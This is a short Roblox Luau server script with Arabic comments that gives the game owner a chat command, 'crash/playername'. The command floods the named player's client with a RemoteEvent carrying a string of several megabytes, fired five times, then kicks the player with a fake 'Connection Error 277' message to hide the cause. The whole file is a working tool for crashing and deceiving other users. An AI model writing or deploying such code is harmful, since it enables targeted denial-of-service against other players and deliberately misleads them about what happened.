local OWNER_ID = 10080511071 -- الآيدي الخاص بك
local Remote = Instance.new("RemoteEvent", game.ReplicatedStorage)
Remote.Name = "CrashEvent"

game.Players.PlayerChatted:Connect(function(type, player, message)
	if player.UserId ~= OWNER_ID then return end -- أنت فقط من يتحكم
	
	-- الأمر يكون هكذا: crash/اسم اللاعب
	local split = string.split(message, "/")
	if split[1] == "crash" and split[2] then
		local targetName = split[2]
		local target = game.Players:FindFirstChild(targetName)
		
		if target then
			print("Executing crash on: " .. target.Name)
			
			-- إرسال بيانات ضخمة لجهاز الهدف فقط
			task.spawn(function()
				local data = string.rep("CRASH_", 2000000)
				for i = 1, 5 do
					if target.Parent then
						Remote:FireClient(target, data)
						task.wait(0.05)
					end
				end
			end)
			
			-- طرد نهائي
			task.delay(0.5, function()
				if target then target:Kick("Connection Error 277") end
			end)
		end
	end
end)
